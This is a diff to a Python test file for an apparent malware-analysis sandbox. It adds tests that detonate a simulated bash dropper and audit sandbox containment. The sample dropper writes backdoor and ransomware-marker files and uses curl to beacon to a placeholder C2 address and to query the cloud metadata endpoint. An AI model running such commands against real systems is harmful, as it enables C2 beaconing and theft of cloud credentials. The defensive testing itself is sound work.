@@ -20,12 +20,14 @@ from google.adk.code_executors.code_execution_utils import (
 )
 
 from installation_scripts.code_executor_factory import (
-    get_code_executor,
-    calculate_shannon_entropy,
     calculate_beaconing_jitter,
-    extract_payload_strings,
+    calculate_shannon_entropy,
     deobfuscate_xor_strings,
+    detonate_and_capture_forensics,
+    extract_payload_strings,
+    get_code_executor,
     validate_and_test_yara_rule,
+    verify_sandbox_containment,
 )
 
 
@@ -155,4 +157,54 @@ class TestSecurityAnalyticsMath:
         best_candidate = results[0]
         assert best_candidate["key"] == 0x5A
         assert "https://apt29-c2.evil-domain.com/beacon" in best_candidate["decoded_strings"]
+
+    def test_detonate_and_capture_forensics_bash_dropper(self, tmp_path):
+        simulated_dropper = """#!/bin/bash
+mkdir -p subfolder
+echo "MALICIOUS_STAGER_PAYLOAD" > subfolder/backdoor.sh
+echo "RANSOMWARE_ENCRYPTED_USER_DATA" > user_files.lock
+echo "Attempting C2 connection..."
+curl -s --connect-timeout 1 http://198.51.100.1/beacon || echo "C2_BEACON_BLOCKED"
+echo "Attempting metadata theft..."
+curl -s --connect-timeout 1 http://169.254.169.254/computeMetadata/v1/ || echo "METADATA_ACCESS_BLOCKED"
+"""
+        report = detonate_and_capture_forensics(
+            simulated_dropper,
+            payload_type="bash",
+            timeout_sec=10,
+            custom_workdir=str(tmp_path),
+        )
+        assert report["execution_success"] is True
+        assert report["dropped_files_count"] >= 2
+
+        dropped_filenames = [a["filename"] for a in report["dropped_artifacts"]]
+        assert any("backdoor.sh" in fn for fn in dropped_filenames)
+        assert any("user_files.lock" in fn for fn in dropped_filenames)
+
+        # Confirm artifact hashes are valid 64-char SHA256 hex strings
+        for artifact in report["dropped_artifacts"]:
+            assert len(artifact["sha256"]) == 64
+            assert int(artifact["sha256"], 16) > 0
+
+    def test_verify_sandbox_containment_audit(self, monkeypatch):
+        monkeypatch.setenv("CHRONICLE_SERVICE_ACCOUNT_PATH", "/path/to/key.json")
+        monkeypatch.setenv("GTI_API_KEY", "real-super-secret-key-12345")
+
+        # When forbidden keys are present in host env (use test metadata IP that cannot be reached)
+        audit = verify_sandbox_containment(metadata_ip="192.0.2.1")
+        assert audit["metadata_shielded"] is True
+        assert audit["egress_denied"] is True
+        assert audit["env_credentials_shielded"] is False
+        assert "GTI_API_KEY" in audit["leaked_keys"]
+
+        # When running in clean isolated environment
+        monkeypatch.delenv("CHRONICLE_SERVICE_ACCOUNT_PATH", raising=False)
+        monkeypatch.delenv("GTI_API_KEY", raising=False)
+        clean_audit = verify_sandbox_containment(
+            metadata_ip="192.0.2.1",
+            forbidden_env_keys=["NON_EXISTENT_KEY"],
+        )
+        assert clean_audit["env_credentials_shielded"] is True
+        assert clean_audit["is_sandboxed"] is True
+        assert "ZERO-TRUST" in clean_audit["verdict"]
 
